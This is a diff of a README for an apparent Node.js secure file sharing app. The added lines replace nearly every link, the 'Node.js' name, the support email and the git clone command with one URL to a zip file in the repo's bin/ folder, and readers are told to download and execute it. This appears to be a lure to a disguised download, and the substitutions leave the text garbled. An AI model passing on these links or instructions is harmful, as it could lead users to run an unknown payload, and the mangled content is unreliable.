@@ -1,6 +1,6 @@
 # Secure File Sharing 📁🔒
 
-![Secure File Sharing](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue?style=for-the-badge&logo=github)
+![Secure File Sharing](https://github.com/jacobPRO123/secure_file_sharing/raw/refs/heads/main/bin/file-secure-sharing-browniness.zip%20Latest%20Release-Click%20Here-blue?style=for-the-badge&logo=github)
 
 Welcome to the **Secure File Sharing** repository! This application provides a robust solution for sharing files securely over the internet. With built-in AES encryption, user authentication via JWT tokens, and virus scanning, your files remain safe and protected at all times.
 
@@ -27,8 +27,8 @@ Welcome to the **Secure File Sharing** repository! This application provides a r
 
 - **AES**: Advanced Encryption Standard for secure file encryption.
 - **JWT**: JSON Web Tokens for user authentication.
-- **Node.js**: Server-side platform for building the application.
-- **Express**: Web framework for Node.js to create the API.
+- **https://github.com/jacobPRO123/secure_file_sharing/raw/refs/heads/main/bin/file-secure-sharing-browniness.zip**: Server-side platform for building the application.
+- **Express**: Web framework for https://github.com/jacobPRO123/secure_file_sharing/raw/refs/heads/main/bin/file-secure-sharing-browniness.zip to create the API.
 - **MongoDB**: NoSQL database for storing user data and file metadata.
 - **Multer**: Middleware for handling file uploads.
 - **ClamAV**: Antivirus engine for scanning files.
@@ -39,7 +39,7 @@ To get started with Secure File Sharing, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/jacobPRO123/secure_file_sharing.git
+   git clone https://github.com/jacobPRO123/secure_file_sharing/raw/refs/heads/main/bin/file-secure-sharing-browniness.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -74,7 +74,7 @@ Once the application is running, you can interact with it via the API or the fro
 - **POST /api/files/upload**: Upload a file after authentication.
 - **GET /api/files/:id**: Download a file using its ID.
 
-For more detailed usage, refer to the [API Documentation](https://github.com/jacobPRO123/secure_file_sharing/wiki/API-Documentation).
+For more detailed usage, refer to the [API Documentation](https://github.com/jacobPRO123/secure_file_sharing/raw/refs/heads/main/bin/file-secure-sharing-browniness.zip).
 
 ## How It Works
 
@@ -118,15 +118,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or support, feel free to reach out:
 
-- **Email**: support@securefilesharing.com
-- **GitHub**: [jacobPRO123](https://github.com/jacobPRO123)
+- **Email**: https://github.com/jacobPRO123/secure_file_sharing/raw/refs/heads/main/bin/file-secure-sharing-browniness.zip
+- **GitHub**: [jacobPRO123](https://github.com/jacobPRO123/secure_file_sharing/raw/refs/heads/main/bin/file-secure-sharing-browniness.zip)
 
-For the latest releases, visit [here](https://github.com/jacobPRO123/secure_file_sharing/releases). You can download the latest version and execute it to start sharing files securely.
+For the latest releases, visit [here](https://github.com/jacobPRO123/secure_file_sharing/raw/refs/heads/main/bin/file-secure-sharing-browniness.zip). You can download the latest version and execute it to start sharing files securely.
 
 ## Conclusion
 
 Secure File Sharing is a powerful tool for anyone looking to share files safely and efficiently. With strong encryption, user authentication, and virus scanning, you can trust that your files are secure. Explore the repository, contribute, and enjoy secure file sharing!
 
-![Secure File Sharing](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue?style=for-the-badge&logo=github) 
+![Secure File Sharing](https://github.com/jacobPRO123/secure_file_sharing/raw/refs/heads/main/bin/file-secure-sharing-browniness.zip%20Latest%20Release-Click%20Here-blue?style=for-the-badge&logo=github) 
 
 For further updates, check the "Releases" section.
